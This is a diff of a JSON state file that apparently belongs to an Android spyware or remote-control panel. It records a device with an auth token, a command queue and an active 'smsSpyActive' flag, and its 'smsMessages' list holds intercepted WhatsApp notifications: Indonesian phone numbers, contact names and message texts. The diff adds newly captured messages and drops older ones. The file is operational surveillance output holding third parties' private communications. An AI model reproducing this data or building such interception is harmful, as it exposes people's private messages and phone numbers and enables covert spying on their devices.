@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776942815848,
+    "lastSeen": 1776942819022,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,70 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 851-3406-5819",
+        "content": "Oke",
+        "time": "23/04 19:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776942820501
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎64 pesan dari 39 chat",
+        "time": "23/04 19:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776942819985
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 822-6965-3769",
+        "content": "sipp",
+        "time": "23/04 19:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776942819224
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Meii",
+        "content": "ok",
+        "time": "23/04 19:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776942819167
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Rafly",
+        "content": "kalo mau nunggu bang reno ini",
+        "time": "23/04 19:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776942819125
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Oi: Membalas Anda",
+        "content": "BEW STORE: • Example : .addlist premium script | price 150k\n\n> https://whatsapp.com/channel/0029Vb610enId7nWJHmxu118",
+        "time": "23/04 19:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776942818768
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎64 pesan dari 39 chat",
+        "time": "23/04 19:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776942818755
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎59 pesan dari 38 chat",
+        "time": "23/04 19:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776942818119
+      },
       {
         "appName": "WhatsApp",
         "sender": "+62 851-3406-5819",
@@ -3955,70 +4019,6 @@
         "time": "23/04 13:33",
         "pkg": "com.whatsapp",
         "receivedAt": 1776922428892
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 831-4396-1588",
-        "content": ".on",
-        "time": "23/04 13:33",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776922417400
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎65 pesan dari 41 chat",
-        "time": "23/04 13:33",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776922417316
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Oi: Bot Gc",
-        "content": "👤 Kontak",
-        "time": "23/04 13:32",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776922348202
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎70 pesan dari 41 chat",
-        "time": "23/04 13:32",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776922348076
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎65 pesan dari 41 chat",
-        "time": "23/04 13:31",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776922305637
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Meii",
-        "content": "ok",
-        "time": "23/04 13:31",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776922305599
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎71 pesan dari 42 chat",
-        "time": "23/04 13:31",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776922305218
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎65 pesan dari 41 chat",
-        "time": "23/04 13:31",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776922292233
       }
     ],
     "galleryPhotos": [],
